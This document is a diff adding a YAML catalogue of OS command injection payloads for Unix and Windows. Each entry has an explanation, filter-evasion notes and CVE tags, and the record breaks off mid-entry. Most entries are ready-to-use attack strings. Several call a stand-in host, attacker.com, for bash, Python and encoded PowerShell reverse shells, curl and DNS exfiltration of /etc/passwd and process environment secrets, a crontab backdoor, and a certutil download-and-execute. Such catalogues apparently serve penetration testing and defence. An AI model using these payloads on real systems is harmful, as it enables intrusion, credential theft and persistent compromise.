@@ -1,0 +1,916 @@
+slug: cmdi
+name: Command Injection
+owasp: A03:2021 – Injection
+description: 'Command injection occurs when user-controlled input is passed to a system shell command without proper sanitization,
+  allowing the attacker to append or substitute OS commands. Successful exploitation grants arbitrary code execution on the
+  host operating system with the privileges of the web server process. It is one of the most severe vulnerability classes,
+  often leading directly to full server compromise.
+
+  '
+severity_range:
+  low: CVSS 7.2
+  high: CVSS 9.8
+references:
+- label: OWASP Command Injection
+  url: https://owasp.org/www-community/attacks/Command_Injection
+- label: PortSwigger OS Command Injection
+  url: https://portswigger.net/web-security/os-command-injection
+groups:
+- slug: unix-basic
+  name: Unix/Linux Basic Command Injection
+  description: Standard command injection payloads for Unix/Linux systems that chain or terminate shell commands to execute
+    attacker-controlled commands.
+  difficulty: low
+  prerequisites:
+  - Application passes user input to shell (system(), exec(), popen())
+  - Unix/Linux server OS
+  - Input not properly sanitized or escaped
+  payloads:
+  - id: cmdi-unix-001
+    title: Semicolon command separator
+    payload_string: ; id
+    how_it_works: 'The semicolon is the Unix shell command separator, allowing multiple commands on a single line. When appended
+      to an existing command parameter, the injected command executes after the original command completes, regardless of
+      the original command''s exit code. The ''id'' command reveals the current user, UID, and GID, confirming successful
+      execution and identifying privilege level. Replacing ''id'' with any other command achieves arbitrary code execution
+      on the server.
+
+      '
+    prerequisites:
+    - Input passed to Unix shell command
+    - Semicolon not filtered
+    waf_bypass_notes: Semicolon is the most basic separator; WAFs typically detect it; use %3b
+    severity_context: CVSS 9.8 – arbitrary OS command execution as web server user
+    cve_refs:
+    - CVE-2014-6271
+    tags:
+    - unix
+    - basic
+    - semicolon
+    - rce
+    - identity-disclosure
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-unix-002
+    title: Pipe command chaining
+    payload_string: '| whoami'
+    how_it_works: 'The Unix pipe operator (|) redirects the stdout of the preceding command as stdin to the following command.
+      When injected, the original command''s output is piped to the attacker''s command. The ''whoami'' command outputs the
+      current user name. Even if the pipe filters the original command''s output, whoami''s output is returned. This is especially
+      useful when the application displays command output to the user, providing direct confirmation of the current process
+      identity.
+
+      '
+    prerequisites:
+    - Input passed to shell command
+    - Pipe character not filtered
+    waf_bypass_notes: Use %7c URL encoding; double pipe || as alternative
+    severity_context: CVSS 9.8 – user identity disclosure and arbitrary command execution
+    cve_refs:
+    - CVE-2014-6271
+    tags:
+    - unix
+    - basic
+    - pipe
+    - rce
+    - whoami
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-unix-003
+    title: Backtick command substitution
+    payload_string: '`id`'
+    how_it_works: 'Backtick command substitution is a Unix shell feature where the enclosed command is executed and its output
+      is substituted in place. When injected into a command argument, the backtick-enclosed command executes and the result
+      is interpolated into the surrounding command string. This is particularly effective when injection occurs inside a string
+      argument, as the backticks cause a nested shell invocation. Both bash and sh support this syntax.
+
+      '
+    prerequisites:
+    - Input passed to shell with backtick interpolation
+    - Shell expands backticks in the injection context
+    waf_bypass_notes: Backticks may bypass filters that only block ; and |; use $(cmd) as alternate
+    severity_context: CVSS 9.8 – command substitution for nested shell execution
+    cve_refs:
+    - CVE-2014-6271
+    tags:
+    - unix
+    - basic
+    - backtick
+    - command-substitution
+    - rce
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-unix-004
+    title: Dollar parenthesis substitution
+    payload_string: $(id)
+    how_it_works: 'The $() syntax is the POSIX-standard form of command substitution, equivalent to backticks but nestable
+      and more readable. When injected, the shell executes the enclosed command and substitutes the result. $() is more portable
+      than backticks and works in bash, sh, zsh, and other POSIX-compliant shells. In web contexts, the dollar sign may not
+      be filtered as aggressively as semicolons or pipes, making this a useful bypass.
+
+      '
+    prerequisites:
+    - Input passed to Unix shell
+    - Shell is bash/sh/POSIX-compatible
+    waf_bypass_notes: Dollar sign in $() may bypass semicolon/pipe filters; try %24(id)
+    severity_context: CVSS 9.8 – POSIX command substitution RCE
+    cve_refs:
+    - CVE-2014-7169
+    tags:
+    - unix
+    - basic
+    - dollar-paren
+    - posix
+    - rce
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-unix-005
+    title: Logical AND chaining
+    payload_string: '&& id'
+    how_it_works: 'The && operator executes the second command only if the first command exits with a success code (exit 0).
+      If the original command succeeds (which it typically will for a functioning application), the injected command executes.
+      This is useful when the semicolon is filtered but && is not. The double-ampersand is visually similar to HTML entities,
+      so some input display may confuse it, but shell execution handles it correctly.
+
+      '
+    prerequisites:
+    - Original command exits with success code
+    - Semicolon filtered but && not
+    waf_bypass_notes: 'Try URL encoding: %26%26; or use & single ampersand for background execution'
+    severity_context: CVSS 9.8 – conditional command execution on success
+    cve_refs:
+    - CVE-2014-7169
+    tags:
+    - unix
+    - basic
+    - and-operator
+    - conditional-execution
+    - rce
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-unix-006
+    title: Newline command separator
+    payload_string: '%0a id'
+    how_it_works: 'A URL-encoded newline character (%0a) acts as a command separator in shell contexts, equivalent to pressing
+      Enter. Many WAFs and input filters check for semicolons and pipes but overlook newline characters. When the URL-decoded
+      newline appears in a shell argument, it terminates the current command and begins a new one. This is particularly effective
+      in CGI applications or web interfaces that accept URL-encoded parameters directly.
+
+      '
+    prerequisites:
+    - URL-decoded input passed to shell
+    - Newline not stripped from input
+    waf_bypass_notes: Effective bypass for filters that only check ; and |; use %0d%0a for CRLF
+    severity_context: CVSS 9.8 – newline command separator WAF bypass
+    cve_refs: []
+    tags:
+    - unix
+    - basic
+    - newline
+    - url-encoding
+    - waf-bypass
+    - rce
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-unix-007
+    title: Cat passwd via pipe
+    payload_string: '| cat /etc/passwd'
+    how_it_works: 'Reading /etc/passwd is a classic command injection verification step that reveals system usernames, UIDs,
+      home directories, and default shells. On modern systems passwords are in /etc/shadow (not readable without root), but
+      /etc/passwd reveals the user list and is world-readable. The presence of service accounts like www-data, nginx, or apache
+      confirms the web server user. An attacker uses this information to identify privilege level and plan privilege escalation.
+
+      '
+    prerequisites:
+    - Input passed to shell
+    - Read access to /etc/passwd (world-readable by default)
+    waf_bypass_notes: 'cat and passwd are commonly blocked; use: less, more, head, od -c, base64'
+    severity_context: CVSS 7.5 – system user enumeration via /etc/passwd read
+    cve_refs: []
+    tags:
+    - unix
+    - basic
+    - file-read
+    - passwd
+    - reconnaissance
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-unix-008
+    title: Reverse shell via bash
+    payload_string: ; bash -i >& /dev/tcp/attacker.com/4444 0>&1
+    how_it_works: 'This Bash reverse shell uses the /dev/tcp pseudo-device, which redirects stdin/stdout to a TCP connection.
+      When executed, the target server connects back to the attacker''s listener on port 4444. The -i flag makes it interactive.
+      The >& and 0>&1 redirect both stdout and stderr through the TCP connection, providing a fully interactive shell. The
+      attacker runs nc -lvnp 4444 to receive the connection. This is a one-command full interactive shell that works on any
+      system with bash.
+
+      '
+    prerequisites:
+    - Bash shell available on server
+    - Outbound TCP connections allowed to attacker's IP
+    - Attacker running listener on specified port
+    waf_bypass_notes: Outbound connections may be blocked by firewall; use DNS-based shells
+    severity_context: CVSS 9.8 – interactive reverse shell for full server control
+    cve_refs:
+    - CVE-2017-5638
+    tags:
+    - unix
+    - reverse-shell
+    - bash
+    - tcp
+    - interactive
+    - persistence
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-unix-009
+    title: Python reverse shell
+    payload_string: ; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
+    how_it_works: 'Python''s socket and subprocess modules provide a portable reverse shell that works across all Python-capable
+      systems. The script creates a TCP socket, connects to the attacker''s listener, and duplicates the socket''s file descriptor
+      to stdin, stdout, and stderr. It then spawns /bin/sh with these file descriptors, giving the attacker a shell through
+      the TCP connection. Python3 is available on virtually all modern Linux servers, making this extremely portable.
+
+      '
+    prerequisites:
+    - Python3 installed on server
+    - Outbound TCP to attacker port allowed
+    waf_bypass_notes: Python one-liners can be split across multiple shell parameters
+    severity_context: CVSS 9.8 – Python-based reverse shell, highly portable
+    cve_refs:
+    - CVE-2019-0232
+    tags:
+    - unix
+    - reverse-shell
+    - python
+    - portable
+    - interactive
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-unix-010
+    title: Curl-based OOB confirmation
+    payload_string: ; curl http://attacker.com/$(whoami)
+    how_it_works: 'When the application does not display command output (blind command injection), out-of- band (OOB) techniques
+      confirm execution by making an HTTP request to an attacker- controlled server. The URL path includes the output of whoami
+      via command substitution, embedding the server''s current user in the HTTP GET request. The attacker''s server logs
+      show the path including the username, confirming both code execution and the privilege level. This works even when the
+      application response is not observable.
+
+      '
+    prerequisites:
+    - curl installed on server
+    - Outbound HTTP to attacker server allowed
+    waf_bypass_notes: Use wget, fetch, or python requests if curl not available
+    severity_context: CVSS 9.8 – blind CMDi confirmation via OOB HTTP request
+    cve_refs: []
+    tags:
+    - unix
+    - oob
+    - curl
+    - blind-confirmation
+    - dns-exfil
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: unix-blind
+  name: Unix Blind Command Injection
+  description: Command injection where output is not reflected in the HTTP response; requires time-based or OOB techniques
+    to confirm and extract data.
+  difficulty: high
+  prerequisites:
+  - Command injection exists but output not visible in response
+  - Time delays measurable or OOB channel available
+  payloads:
+  - id: cmdi-ubl-001
+    title: Sleep-based blind confirmation
+    payload_string: ; sleep 5
+    how_it_works: 'The Unix sleep command pauses execution for a specified number of seconds. When injected into a blind command
+      injection point, a 5-second delay in the HTTP response confirms that the command executed. Unlike output-based injection,
+      timing provides the only confirmation channel. The attacker measures normal response time and compares it to the sleep-injected
+      response. A 5-second delay is observable without triggering typical timeouts (10-30 second defaults) in HTTP clients.
+
+      '
+    prerequisites:
+    - Injection point executes shell commands
+    - HTTP response time measurable
+    waf_bypass_notes: sleep is commonly blocked; use ping -c 5 127.0.0.1 as alternative
+    severity_context: CVSS 9.8 – blind CMDi timing confirmation
+    cve_refs:
+    - CVE-2019-11043
+    tags:
+    - unix
+    - blind
+    - sleep
+    - timing
+    - confirmation
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-ubl-002
+    title: Ping-based blind delay
+    payload_string: '| ping -c 5 127.0.0.1'
+    how_it_works: 'The ping command with -c 5 sends exactly 5 ICMP packets to localhost, each taking approximately 1 second,
+      creating a reliable 5-second delay without requiring the ''sleep'' keyword. This is the primary blind confirmation technique
+      when ''sleep'' is filtered. On some systems, ping delays are more consistent than sleep due to OS scheduling. The loopback
+      address (127.0.0.1) ensures the ping always succeeds without network connectivity requirements.
+
+      '
+    prerequisites:
+    - ping command available (standard on all Unix systems)
+    - sleep filtered but ping not
+    waf_bypass_notes: ping is an alternative to sleep; both may be filtered by WAF
+    severity_context: CVSS 9.8 – blind CMDi via ICMP-based timing delay
+    cve_refs:
+    - CVE-2014-6271
+    tags:
+    - unix
+    - blind
+    - ping
+    - timing
+    - sleep-alternative
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-ubl-003
+    title: DNS exfiltration via nslookup
+    payload_string: ; nslookup $(whoami).attacker.com
+    how_it_works: 'DNS-based OOB exfiltration embeds command output as a subdomain in a DNS lookup. The nslookup command resolves
+      the hostname $(whoami).attacker.com, where the username is substituted via command substitution. The DNS query for this
+      hostname reaches the attacker''s DNS server (configured as the authoritative server for attacker.com), which logs the
+      subdomain. The attacker reads the queried subdomain from DNS logs to extract the server''s current user. DNS exfiltration
+      works even when HTTP is blocked.
+
+      '
+    prerequisites:
+    - nslookup or dig available on server
+    - Outbound DNS queries allowed
+    - Attacker controls authoritative DNS for attacker.com
+    waf_bypass_notes: DNS exfiltration bypasses HTTP egress filtering; use Burp Collaborator
+    severity_context: CVSS 9.8 – blind CMDi data exfiltration via DNS subdomain
+    cve_refs:
+    - CVE-2021-22205
+    tags:
+    - unix
+    - blind
+    - dns-exfil
+    - oob
+    - nslookup
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-ubl-004
+    title: Output redirect to web root
+    payload_string: ; id > /var/www/html/output.txt
+    how_it_works: 'When direct output is not visible in the response, redirecting command output to a file in the web root
+      makes it accessible via HTTP. This converts blind command injection to output-visible injection. The attacker writes
+      command output to output.txt in the web server''s document root, then retrieves it via a browser or curl. This requires
+      write access to the web root, which is common when the web server process runs as the www-data or apache user. The web
+      root path is discovered from error messages or configuration files.
+
+      '
+    prerequisites:
+    - Write access to web server document root
+    - Known or discoverable web root path
+    waf_bypass_notes: Output redirection converts blind to visible injection; find web root first
+    severity_context: CVSS 9.8 – blind to visible CMDi via file redirect
+    cve_refs:
+    - CVE-2018-1000861
+    tags:
+    - unix
+    - blind
+    - file-redirect
+    - web-root
+    - output-extraction
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-ubl-005
+    title: Curl with base64 encoded data exfil
+    payload_string: ; curl -d "$(cat /etc/passwd | base64)" http://attacker.com/collect
+    how_it_works: 'This payload reads /etc/passwd, base64-encodes the content to handle special characters and newlines, and
+      sends it as an HTTP POST body to the attacker''s server. Base64 encoding ensures the binary-safe transmission of multi-line
+      file contents over HTTP. The attacker''s server logs or receives the POST body containing the encoded passwd file. This
+      demonstrates full file exfiltration via blind command injection using out-of-band HTTP channels.
+
+      '
+    prerequisites:
+    - curl and base64 commands available
+    - Outbound HTTP to attacker server allowed
+    waf_bypass_notes: POST body is base64; hard to detect; use HTTPS for encrypted transport
+    severity_context: CVSS 9.8 – file exfiltration via OOB HTTP POST from blind CMDi
+    cve_refs:
+    - CVE-2022-26134
+    tags:
+    - unix
+    - blind
+    - curl
+    - base64
+    - file-exfil
+    - oob
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-ubl-006
+    title: Backdoor via crontab
+    payload_string: ; echo '*/5 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /var/spool/cron/www-data
+    how_it_works: 'Blind command injection can establish persistence by adding a cron job that periodically calls back to
+      the attacker. This payload appends a crontab entry that runs a reverse shell every 5 minutes. Even if the original injection
+      point is patched, the cron job maintains persistent access. The crontab location varies by OS. This requires write access
+      to the cron spool directory. Persistence is a critical post-exploitation objective to maintain access after remediation.
+
+      '
+    prerequisites:
+    - Write access to crontab file or cron spool directory
+    - Outbound TCP from cron process to attacker IP
+    waf_bypass_notes: Multi-step persistence attack; initial injection establishes foothold
+    severity_context: CVSS 9.8 – blind CMDi used to establish crontab-based persistence
+    cve_refs: []
+    tags:
+    - unix
+    - blind
+    - persistence
+    - crontab
+    - reverse-shell
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-ubl-007
+    title: Blind CMDi via DNS Exfiltration with hostname Canary
+    payload_string: '; hostname | base64 | xargs -I{} curl "http://{}.attacker.com"
+
+      '
+    encoding: none
+    how_it_works: 'This payload exfiltrates the server''s hostname via DNS by base64-encoding the hostname output and appending
+      it as a subdomain label in a DNS lookup to an attacker-controlled domain, triggering a DNS query visible in the attacker''s
+      DNS logs. Because the data travels via DNS rather than HTTP, it bypasses egress firewalls that block direct TCP connections
+      while permitting DNS traffic, a common enterprise pattern. The base64 encoding handles hostnames with special characters
+      and keeps each label within the 63-character DNS label length limit for reliable exfiltration.
+
+      '
+    context_of_use: Blind Unix CMDi where direct TCP egress is blocked but DNS is allowed
+    prerequisites:
+    - Outbound DNS from target to attacker's authoritative name server
+    - curl or wget present on target
+    waf_bypass_notes: Encode semicolon as %3B; split payload across multiple parameters
+    severity_context: CVSS 8.0 – confirms blind CMDi and leaks hostname/environment data via DNS
+    cve_refs: []
+    tags:
+    - unix
+    - blind
+    - dns-exfil
+    - oob
+    - hostname
+    - base64
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-ubl-008
+    title: Blind CMDi via /proc/self/environ Environment Variable Leak
+    payload_string: '; cat /proc/self/environ | tr ''\0'' ''\n'' | curl -d @- http://attacker.com/env
+
+      '
+    encoding: none
+    how_it_works: 'Linux exposes the full environment of a running process at /proc/self/environ as a null-byte delimited
+      string; reading it reveals secrets injected as environment variables such as database credentials, API keys, and cloud
+      metadata tokens. The tr command converts null bytes to newlines for clean formatting before piping the entire environment
+      dump to an attacker-controlled HTTP endpoint via curl. This is a high-impact blind exfiltration primitive because environment
+      variables commonly contain secrets that developers intend never to appear in logs or responses.
+
+      '
+    context_of_use: Blind Unix CMDi on Linux where /proc filesystem is accessible (most non-container deployments)
+    prerequisites:
+    - Linux target with /proc filesystem mounted
+    - Outbound HTTP from the process to attacker server
+    waf_bypass_notes: Split across newline-terminated commands; use wget if curl absent
+    severity_context: CVSS 9.1 – exfiltrates process environment including credentials and API keys
+    cve_refs: []
+    tags:
+    - unix
+    - blind
+    - proc-environ
+    - env-leak
+    - credentials
+    - oob
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: windows-basic
+  name: Windows Basic Command Injection
+  description: Command injection payloads targeting Windows systems using cmd.exe and PowerShell syntax.
+  difficulty: low
+  prerequisites:
+  - Application running on Windows server
+  - User input passed to cmd.exe, WScript, or PowerShell
+  payloads:
+  - id: cmdi-win-001
+    title: Windows ampersand separator
+    payload_string: '& whoami'
+    how_it_works: 'The single ampersand (&) in Windows cmd.exe is the command separator, equivalent to the Unix semicolon.
+      It executes the second command regardless of the first command''s success. The ''whoami'' command on Windows returns
+      the domain\username or COMPUTERNAME\username format, revealing whether the server runs under a domain account or local
+      service account. Administrative users (NT AUTHORITY\SYSTEM) indicate maximum privilege. This is the first probe for
+      Windows command injection.
+
+      '
+    prerequisites:
+    - Windows server with cmd.exe execution
+    - Input passed to cmd.exe
+    waf_bypass_notes: Use %26 URL encoding; try || as alternative separator
+    severity_context: CVSS 9.8 – Windows user identity disclosure and arbitrary execution
+    cve_refs:
+    - CVE-2014-6278
+    tags:
+    - windows
+    - basic
+    - ampersand
+    - cmd
+    - whoami
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-win-002
+    title: Windows pipe separator
+    payload_string: '| dir C:\'
+    how_it_works: 'The pipe operator on Windows cmd.exe redirects stdout between commands. dir C:\ lists the root directory
+      of the C: drive, revealing installed programs, users, and system structure. This confirms command execution and provides
+      immediate reconnaissance data about the target system layout. The directory listing reveals installed software, potential
+      paths for privilege escalation, and sensitive directories. This is equivalent to ls / on Unix systems.
+
+      '
+    prerequisites:
+    - Windows server, cmd.exe execution
+    waf_bypass_notes: dir is less suspicious than whoami in some contexts
+    severity_context: CVSS 9.8 – filesystem reconnaissance via Windows dir command
+    cve_refs:
+    - CVE-2014-6278
+    tags:
+    - windows
+    - basic
+    - pipe
+    - dir
+    - reconnaissance
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-win-003
+    title: PowerShell execution via cmd
+    payload_string: '& powershell -Command "Get-Process"'
+    how_it_works: 'When cmd.exe injection is confirmed, invoking PowerShell through it provides access to the full .NET framework
+      and PowerShell cmdlets. PowerShell offers significantly more powerful capabilities than cmd.exe: network communications,
+      file system access, Registry manipulation, and .NET runtime features. Get-Process lists running processes, revealing
+      security software, databases, and other sensitive services. PowerShell''s presence dramatically expands post-exploitation
+      capabilities.
+
+      '
+    prerequisites:
+    - Windows server with PowerShell installed (default on Vista/Server 2008+)
+    - cmd.exe execution via injection
+    waf_bypass_notes: PowerShell execution policy may be enforced; use -ExecutionPolicy Bypass
+    severity_context: CVSS 9.8 – elevation from cmd.exe to PowerShell capabilities
+    cve_refs:
+    - CVE-2018-1000861
+    tags:
+    - windows
+    - basic
+    - powershell
+    - process-enum
+    - capability-escalation
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-win-004
+    title: Net user enumeration
+    payload_string: '& net user'
+    how_it_works: 'The ''net user'' command on Windows lists all local user accounts on the system. This reveals administrative
+      accounts, service accounts, and recently created accounts. Combined with ''net localgroup administrators'', it reveals
+      which users have admin privileges. This is a standard Windows privilege escalation reconnaissance step. Identifying
+      service accounts with high privileges is particularly valuable for lateral movement and credential harvesting objectives.
+
+      '
+    prerequisites:
+    - cmd.exe execution on Windows
+    - net command available (standard on all Windows)
+    waf_bypass_notes: Use cmd /c net user to bypass filters that block net directly
+    severity_context: CVSS 7.5 – Windows user enumeration for privilege escalation planning
+    cve_refs: []
+    tags:
+    - windows
+    - basic
+    - net-user
+    - user-enumeration
+    - reconnaissance
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-win-005
+    title: PowerShell reverse shell
+    payload_string: '& powershell -NoP -NonI -W Hidden -Exec Bypass -Enc JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAYQB0AHQAYQBjAGsAZQByAC4AYwBvAG0AIgAsADQANAA0ADQAKQA='
+    how_it_works: 'PowerShell supports Base64-encoded commands via the -EncodedCommand flag, which executes the decoded UTF-16LE
+      PowerShell script. The encoded payload creates a TCP socket to the attacker, establishes a stream reader/writer, and
+      creates an interactive PowerShell session over the network. The -ExecutionPolicy Bypass and -WindowStyle Hidden flags
+      prevent execution policy enforcement and hide the console window. Base64 encoding of the payload bypasses WAF string
+      matching for PowerShell reverse shell keywords.
+
+      '
+    prerequisites:
+    - PowerShell available on Windows server
+    - Outbound TCP to attacker port allowed
+    waf_bypass_notes: Base64 encoding bypasses string-based WAF rules; varies by payload
+    severity_context: CVSS 9.8 – encoded PowerShell reverse shell for interactive access
+    cve_refs: []
+    tags:
+    - windows
+    - powershell
+    - reverse-shell
+    - base64-encoded
+    - evasion
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-win-006
+    title: Type command for file read
+    payload_string: '& type C:\Windows\System32\drivers\etc\hosts'
+    how_it_works: 'The ''type'' command in Windows cmd.exe displays file contents, equivalent to Unix cat. Reading the hosts
+      file reveals internal IP address mappings and virtual host configurations, providing network topology information. More
+      sensitive targets include web.config (application credentials and connection strings), unattend.xml (Windows installation
+      credentials), and SAM database files. The hosts file is always readable and provides immediate reconnaissance value.
+
+      '
+    prerequisites:
+    - cmd.exe execution on Windows
+    - Read access to target file
+    waf_bypass_notes: type command is less commonly blocked than cat; try findstr for line filtering
+    severity_context: CVSS 7.5 – Windows file read for network reconnaissance and credentials
+    cve_refs: []
+    tags:
+    - windows
+    - basic
+    - file-read
+    - type-command
+    - reconnaissance
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-win-007
+    title: Certutil for payload download
+    payload_string: '& certutil -urlcache -split -f http://attacker.com/shell.exe C:\Windows\Temp\shell.exe && C:\Windows\Temp\shell.exe'
+    how_it_works: 'Windows Certutil is a legitimate certificate management tool that has become a well-known LOLBin (Living-Off-the-Land
+      Binary) for downloading files. The -urlcache flag downloads a URL and caches it, effectively functioning as wget or
+      curl. The -split flag handles binary data. After downloading, the executable runs from the Windows Temp directory. Certutil
+      is signed by Microsoft and present on all Windows versions since XP, making it a trusted binary that may bypass application
+      whitelisting controls.
+
+      '
+    prerequisites:
+    - certutil.exe present (standard on all Windows)
+    - Outbound HTTP to attacker server
+    - Execute permission on Temp directory
+    waf_bypass_notes: certutil is a signed LOLBin; often not blocked; monitor for certutil web access
+    severity_context: CVSS 9.8 – file download and execute via LOLBin for payload delivery
+    cve_refs: []
+    tags:
+    - windows
+    - basic
+    - certutil
+    - lolbin
+    - download-execute
+    - persistence
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-win-008
+    title: Windows CMDi via PowerShell Encoded Command
+    payload_string: '& powershell -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAGUAcgAuAGMAbwBtAC8AcwBoAGUAbABsAC4AZQBIAGUAJwAsACcAQwA6AFwAVABlAG0AcABcAHMAaABlAGwAbAAuAGUAeABlACcAKQA=
+
+      '
+    encoding: base64-powershell
+    how_it_works: 'PowerShell''s -EncodedCommand flag accepts a Base64-encoded UTF-16LE command string, completely bypassing
+      signature-based detection and WAF rules that match plaintext PowerShell keywords like Invoke-Expression, DownloadFile,
+      or WebClient. The encoded payload expands to a Net.WebClient DownloadFile call, fetching an attacker-controlled executable
+      to the Windows Temp directory for execution. This LOLBin technique is commonly used in post-exploitation chains and
+      is effective against application firewalls that only inspect cleartext command strings.
+
+      '
+    context_of_use: Windows CMDi where application invokes cmd.exe or directly spawns PowerShell
+    prerequisites:
+    - PowerShell accessible on target (present by default on Windows Vista+)
+    - Outbound HTTP from server process to attacker
+    waf_bypass_notes: Base64 encoding bypasses keyword-based WAF rules; vary padding to change signature
+    severity_context: CVSS 9.8 – RCE via PowerShell encoded command enabling payload download and execution
+    cve_refs: []
+    tags:
+    - windows
+    - basic
+    - powershell
+    - encoded-command
+    - lolbin
+    - bypass
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: windows-blind
+  name: Windows Blind Command Injection
+  description: Command injection on Windows where output is not visible in the HTTP response; relies on time delays and out-of-band
+    channels.
+  difficulty: high
+  prerequisites:
+  - Windows command injection where output is not reflected
+  - Timing or OOB channel available
+  payloads:
+  - id: cmdi-wbl-001
+    title: Windows ping timing delay
+    payload_string: '& ping -n 5 127.0.0.1'
+    how_it_works: 'On Windows, ping sends one ICMP packet per second by default, so -n 5 creates approximately a 4-second
+      delay (first ping is immediate, then 4 more at 1-second intervals). This is the Windows equivalent of Unix sleep and
+      is the primary timing technique for Windows blind command injection since there is no native sleep command in standard
+      cmd.exe. The delay confirms injection and timing can be used for character-by-character data extraction.
+
+      '
+    prerequisites:
+    - Windows server with cmd.exe execution
+    - Blind injection (no output visible)
+    waf_bypass_notes: ping.exe is standard and signed; rarely blocked; adjust -n for delay length
+    severity_context: CVSS 9.8 – Windows blind CMDi timing confirmation via ping
+    cve_refs:
+    - CVE-2014-6278
+    tags:
+    - windows
+    - blind
+    - ping
+    - timing
+    - confirmation
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-wbl-002
+    title: PowerShell Start-Sleep
+    payload_string: '& powershell -Command "Start-Sleep -Seconds 5"'
+    how_it_works: 'PowerShell''s Start-Sleep cmdlet provides a sleep/delay function not natively available in cmd.exe. Combined
+      with PowerShell execution via the cmd.exe & operator, this creates a reliable timing oracle for Windows blind injection.
+      If PowerShell is accessible, this provides more precise timing than ping. The 5-second delay is distinct and measurable.
+      It confirms that both cmd.exe injection and PowerShell execution work, opening the door to more sophisticated PowerShell-based
+      exploitation.
+
+      '
+    prerequisites:
+    - PowerShell accessible from cmd.exe injection
+    waf_bypass_notes: Start-Sleep is a PowerShell cmdlet; use timeout /t 5 as cmd.exe alternative
+    severity_context: CVSS 9.8 – PowerShell-based timing confirmation for Windows blind CMDi
+    cve_refs:
+    - CVE-2018-1000861
+    tags:
+    - windows
+    - blind
+    - powershell
+    - sleep
+    - timing
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-wbl-003
+    title: DNS exfiltration via nslookup on Windows
+    payload_string: '& for /f "tokens=*" %i in (''whoami'') do nslookup %i.attacker.com'
+    how_it_works: 'This Windows for-loop reads the output of whoami and substitutes it as the DNS hostname to resolve via
+      nslookup. The DNS query for username.attacker.com reaches the attacker''s DNS server, exfiltrating the username via
+      the DNS subdomain. This works even when HTTP egress is blocked because DNS queries typically are not restricted. The
+      for-loop with backtick-equivalent syntax handles the command output substitution in cmd.exe context where backticks
+      are not available.
+
+      '
+    prerequisites:
+    - Windows server with nslookup (standard)
+    - Outbound DNS queries to attacker's authoritative server
+    waf_bypass_notes: DNS exfiltration bypasses HTTP filtering; use Burp Collaborator for DNS
+    severity_context: CVSS 9.8 – Windows blind CMDi DNS exfiltration
+    cve_refs:
+    - CVE-2021-22205
+    tags:
+    - windows
+    - blind
+    - dns-exfil
+    - nslookup
+    - for-loop
+    - oob
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-wbl-004
+    title: PowerShell OOB HTTP exfiltration
+    payload_string: '& powershell -Command "Invoke-WebRequest -Uri (''http://attacker.com/''+[System.Environment]::UserName)
+      -Method GET"'
+    how_it_works: 'PowerShell''s Invoke-WebRequest (alias: curl, wget on PowerShell 3+) makes HTTP requests from the server.
+      Embedding the username via [System.Environment]::UserName in the URL path exfiltrates it to the attacker''s HTTP server.
+      This is the Windows equivalent of Unix curl-based OOB exfiltration. The use of .NET runtime environment properties provides
+      access to system information without spawning additional processes. The attacker''s HTTP access logs record the incoming
+      request with the username in the path.
+
+      '
+    prerequisites:
+    - PowerShell 3.0+ available
+    - Outbound HTTP to attacker server
+    waf_bypass_notes: Invoke-WebRequest is a legitimate cmdlet; obfuscate by splitting the command
+    severity_context: CVSS 9.8 – PowerShell HTTP OOB exfil for Windows blind CMDi
+    cve_refs: []
+    tags:
+    - windows
+    - blind
+    - powershell
+    - invoke-webrequest
+    - oob
+    - exfiltration
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-wbl-005
+    title: Conditional ping for boolean extraction
